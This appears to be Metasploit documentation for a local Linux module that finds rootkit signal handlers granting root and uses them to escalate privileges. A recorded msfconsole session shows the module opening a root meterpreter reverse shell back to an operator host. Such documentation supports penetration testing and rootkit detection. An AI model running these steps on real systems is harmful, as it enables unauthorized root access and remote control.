## Vulnerable Application

This module searches for rootkits which use signals to elevate
process privileges to UID 0 (root).

Some rootkits install signal handlers which listen for specific
signals to elevate process privileges. This module identifies these
rootkits by sending signals and observing UID switching to root.

This module has been tested successfully with:

* [Singularity](https://github.com/MatheuZSecurity/Singularity) 5b6c4b6 (2025-10-19) on Ubuntu 24.04 kernel 6.14.0-33-generic (x64)
* [Diamorphine](https://github.com/m0nad/Diamorphine) 2337293 (2023-09-20) on Ubuntu 22.04 kernel 5.19.0-38-generic (x64)
* [Codeine](https://github.com/diego-tella/Codeine) 9644336 (2025-09-02) on Ubuntu 22.04 kernel 5.19.0-38-generic (x64)


## Verification Steps

1. Start `msfconsole`
2. Get a session
3. `use exploit/linux/local/rootkit_privesc_signal_hunter`
4. `set SESSION [SESSION]`
5. `set PAYLOAD [PAYLOAD]`
6. `check`
7. `run`
8. You should get a new *root* session


## Options


### MIN_SIGNAL

Start at signal (default: `0`)

### MAX_SIGNAL

Stop at signal (default: `64`)

### PID

Process ID to send signals to (leave blank to spawn a new process) (default: blank)


## Scenarios

### Singularity 5b6c4b6 (2025-10-19) on Ubuntu 24.04 kernel 6.14.0-33-generic (x64)

```
msf > use exploit/linux/local/rootkit_privesc_signal_hunter
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/rootkit_privesc_signal_hunter) > set session -1
session => -1
msf exploit(linux/local/rootkit_privesc_signal_hunter) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/rootkit_privesc_signal_hunter) > set lhost 192.168.200.130
lhost => 192.168.200.130
msf exploit(linux/local/rootkit_privesc_signal_hunter) > set lport 4444
lport => 4444
msf exploit(linux/local/rootkit_privesc_signal_hunter) > check
[+] The target is vulnerable. Rootkit(s) are installed and configured to elevate privileges for signals.
msf exploit(linux/local/rootkit_privesc_signal_hunter) > run
[*] Started reverse TCP handler on 192.168.200.130:4444 
[*] Trying signals 0 to 64 (PID: $$) ...
[+] Found 1 signals for privilege escalation (59).
[*] Writing '/tmp/.9Z5PXuL7yw' (250 bytes) ...
[*] Trying signal 59 ...
[*] Sending stage (3090404 bytes) to 192.168.200.139
[+] Deleted /tmp/.9Z5PXuL7yw
[*] Meterpreter session 2 opened (192.168.200.130:4444 -> 192.168.200.139:41588) at 2025-10-23 11:18:25 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo 
Computer     : 192.168.200.139
OS           : Ubuntu 24.04 (Linux 6.14.0-33-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
